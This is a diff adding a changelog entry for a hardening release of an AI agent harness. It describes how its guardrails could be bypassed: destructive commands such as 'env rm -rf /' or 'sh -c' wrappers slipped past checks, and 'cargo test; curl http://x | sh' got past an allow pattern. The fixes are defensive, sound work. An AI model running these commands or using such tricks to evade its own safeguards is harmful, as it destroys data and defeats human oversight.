@@ -6,6 +6,23 @@ The format is based on [Keep a Changelog 1.1.0](https://keepachangelog.com/en/1.
 
 ## [Unreleased]
 
+## [v2026.9.6-0] — 2026-09-06 — 2.45.0
+
+**A hardening release.** Seven robustness and trust-boundary fixes surfaced by a comparison pass against xAI Grok Build (see `research/2026-08-23_grok-build-comparison.md`). Several are security-relevant; upgrading is recommended for anyone running `bwoc-harness` against a remote model endpoint or a permissive permission policy.
+
+### Fixed
+
+- **HTTP 429 / 408 are retryable, not fatal** (#486) — a rate limit is the single most common real-world provider failure, yet it aborted the whole run while the *rarer* 5xx got three backoff retries. `classify_http_error` now maps 429 and 408 to a transient error that rides the existing 200 ms→3.2 s backoff loop, and a server `Retry-After` hint is honoured (clamped to ~4× the backoff cap so a hostile or misconfigured endpoint cannot park the run). One function fronts every backend, so the fix is backend-neutral.
+- **Guardrails peel command wrappers before gating** (#487) — the destruction (`Pāṇātipāta`) and privilege-escalation (`Bhava-taṇhā`) checks resolved the binary as the first non-`VAR=val` token, so `env rm -rf /`, `command rm -rf ~`, `timeout 5 rm -rf /`, `xargs rm -rf`, and `sh -c 'rm -rf /'` all walked past the check. A new fail-closed `argv::peel` normalizes a segment to the argv that will actually run (stripping a wrapper set, unwrapping one `sh -c '<literal>'`), wired identically into `check_destruction`, `check_privilege_escalation`, and `sandbox::scan_args`. Guardrails is the unoverridable floor, so this was silent under-blocking.
+- **An allow-pattern can't be tricked by a chained command** (#492) — a pattern `allow "cargo test"` matched the raw JSON substring and granted `{"command":"cargo test; curl http://x | sh"}` whole. An `allow` on a shell-bearing tool now grants only when every peeled segment of the command is covered by an allow pattern (`git` is matched as one literal argv, not shell-split); `deny`/`ask` keep the safe substring match, and unparseable args fail closed.
+- **Operator text typed during a permission prompt is no longer lost** (#489) — the shipped TUI echoed the text locally so it *looked* sent, but `read_permission` treated any non-permission line as a bare deny and discarded it. The tool is still denied (fail-safe), but the text is recovered and replayed as the next turn.
+- **A panic no longer strands the terminal** (#490) — a panic in any TUI event loop left the operator's terminal in raw mode + alternate screen. An RAII `TerminalGuard` restores it on unwind (BWOC uses default unwind panics, so no signal handler is needed) across `bwoc-tui`, `bwoc-loop-tui`, and the CLI dashboard.
+- **`bwoc-deep-memory` insert dedup + embedding-model stamp** (#491) — the full `chat-session.json` was re-mined every resume with no `UNIQUE` constraint, so the store grew linearly; and same-dimension model switches silently mis-ranked. Uniqueness is now `(source, text, embed_model)` with `INSERT OR IGNORE` (idempotent re-mine, yet a model switch re-embeds instead of vanishing), and `search` filters rows to the current model. Secret redaction still runs before insert.
+
+### Added
+
+- **A byte budget on tool output** (#488) — there was no cap anywhere in the tool path, so a whole-file `read_file` or chatty `run_command` was an unbounded context/cost DoS that Layer 0 permits on an untrusted turn. Output is clamped once at the dispatch seam (covering every tool and every MCP tool) to 64 KiB with an *actionable* truncation notice, and `read_file` gains `offset` / `limit` to page a large file deliberately.
+
 ## [v2026.8.20-2] — 2026-08-20 — 2.44.2
 
 **A security release.** Two ways an untrusted turn could escape the trust boundary are closed, both reachable on today's shipped code. Upgrading is recommended for anyone running `bwoc-harness` against a remote or shared model endpoint, or auto-processing inbound agent messages.
